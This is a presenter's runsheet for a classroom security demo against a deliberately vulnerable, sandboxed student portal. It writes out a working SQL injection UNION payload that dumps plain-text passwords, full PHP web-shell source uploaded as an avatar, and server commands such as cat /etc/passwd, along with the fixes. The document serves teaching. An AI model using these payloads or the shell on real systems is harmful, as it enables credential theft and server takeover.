# Runsheet - about 20 minutes

Picks up from slide 13, **DEMO TIME**. Slide 12 has just named the three
classic bugs; this is two of them, on one site, in a row.

## Before you start

- [ ] `docker compose up -d --build` on the droplet, and load the site once
      in the browser you will present from.
- [ ] Browser zoom at 150%. The payloads are long and the back row is real.
- [ ] Have the administrator password written down somewhere, in case the
      injection is being awkward and you need to move on.
- [ ] Close the guided panel. You are the guide for the next 20 minutes.

> The site hands you a *clean* copy because your browser is its own sandbox.
> Walking the whole thing now spoils nothing for the room afterwards.

---

## 0:00 - Frame it (2 min)

Show the sign-in page. One form, nothing else.

> "Nothing on this page says 'hack me', and there is nothing to find here -
> that is the point. Sign in as an ordinary student with the account in the
> guide panel. We are going to end up reading everybody's password and
> running commands on the server, and we start from inside the site, as a
> completely unprivileged account."

Sign in as `ahmad.faiz`. Open **STUDENTS** in the navigation.

> "A directory. A search box. This is the kind of feature every student
> portal has, and it's where we start."

---

## 2:00 - Make the database speak (6 min)

**Type a letter, like `a`, and press Search.** A few rows come back.

> "That text just went into the database and came back as results. Hold on
> to *went into*."

**Clear it. Type a single `'` and press Search.** A red SQL error
appears.

> "That is the database complaining. Not the website - the database. Which
> means what I typed did not arrive as a *name to search for*. It arrived as
> part of the instruction. My apostrophe closed their quote early and the
> rest stopped making sense."

**The money shot.**
`zzz' UNION SELECT 1,username,2,username,password,3,0 FROM users -- -`

> "`zzz` matches no real student, so the only row left is the one I just
> added. `UNION SELECT` bolts a second query onto the first - seven values,
> because the page selects seven columns. I put `username` under Name and
> `password` under Programme. The page does not check what it prints, only
> that there is something to print."

**Stop talking. Let them read it. Scroll slowly.**

> "Forty-two accounts, and that is not a column mislabelled - that is a
> plain-text password sitting under a column called *Programme*. Not hashes
> to crack. Those are the passwords. Look how many are the same word - that's
> slide 2, the hands that went up for *used the same password on two
> sites*."

Scroll until you find the row where Name reads `admin`.

> "And there it is. Notice it is not a weak password. It never had to be -
> they wrote it down for me."

---

## 8:00 - Walk in the front door (2 min)

**LOGOUT**, then sign in as `admin` with the password now on screen.

> "No exploit here. I am typing a username and a password into a login form,
> exactly as intended. From the server's point of view the administrator just
> arrived for work."

Point at the new **DASHBOARD** and **ADMIN** tabs.

---

## 10:00 - Get the server running your code (5 min)

**PROFILE -> Edit profile.** Show the avatar upload.

> "This expects a photo. Let's find out whether it checks."

Show `shell.php` in an editor - a text box and a Run button:

```php
<?php if(isset($_POST["c"])){echo "<pre>".htmlspecialchars(shell_exec($_POST["c"]))."</pre>";}?><body style=background:#fff;font-family:monospace;padding:16px><form method=post><input name=c style=width:95% autofocus><button>Run</button></form>
```

> "Whatever you type in that box, the server runs. That's it. That's the
> whole program."

Upload it. It accepts.

> "No complaint about the extension, because nobody looked. My profile
> picture is now a program."

Click the broken avatar image - it opens in a new tab, same browser, same
cookies. Type `id` in the box, press **Run**.

> "`www-data`. That is not my browser. That is a command, running on a server
> in a data centre, because I uploaded a file."

Then `ls -la`, then `cat /etc/passwd`.

---

## 15:00 - The payoff (3 min)

Open the **Deface the sign-in page** step in the guide. Press **COPY** on
the command - do not retype it, it is long on purpose - and paste it into
the shell tab's box. Press **Run**.

> "This is one shell command. It writes a whole page - styling, animation,
> all of it - because once the server will run anything you send, 'anything'
> includes 'write a very dramatic file'."

Now open the portal's sign-in page.

> "This is the **I** in the CIA triad - integrity. It is also the *least*
> damaging thing I could have done, because you can see it. Somebody notices
> within the hour and it is fixed by Friday."

Click **RESTORE SIGN-IN PAGE**, centred near the bottom.

---

## 18:00 - Land it (2 min)

> "Two bugs. Both decades old. Both still shipping.
>
> The directory search box trusted text to stay text. Fix: bind the
> parameter - pass the search term as a *value*, never as part of the query.
>
> The upload form trusted a filename to describe its contents. Fix: store
> uploads outside the web root, rename them, and never let the server execute
> what a user sent.
>
> And the one that turned a bad day into a catastrophe - passwords stored as
> written. Hashing would not have stopped the injection. It would have stopped
> the injection from *mattering*."

Then slide 13's three rules: **stay in scope, practice targets only, write it
down.**

---

## Letting them play

Give out the URL. Everything they need is in the panel on the right - 12
steps, a copy button on every payload, the student account at the top (sign
in with it first - the injection is behind login now, not on the sign-in
page itself).

Tell them three things:

1. **"The guide is on the right. Open it."**
2. **"You get your own copy of the site. You cannot break it for anybody
   else, and nobody has done it for you already."**
3. **"If you wreck yours, press RESET."**

Then stop talking and let them get stuck. Getting stuck is the lesson.

## If it goes wrong

| Problem | Do this |
|---------|---------|
| SQL payload returns nothing | Check for a smart-quote. Copy from the guide panel instead of typing. |
| Can't log in as admin | Password is in `sql/01-schema.sql`. Keep moving. |
| Upload seems to do nothing | It worked - the toast says where it went. The broken-image avatar *is* the shell. |
| Shell gives a blank page | The command ran and printed nothing. Try `id`. |
| Deface command does nothing | It must be pasted into the shell's box, not retyped - it is long and has exact punctuation. Press COPY, then Run. |
| Site is wrecked | **RESET** in the top strip. Two seconds, and only yours. |
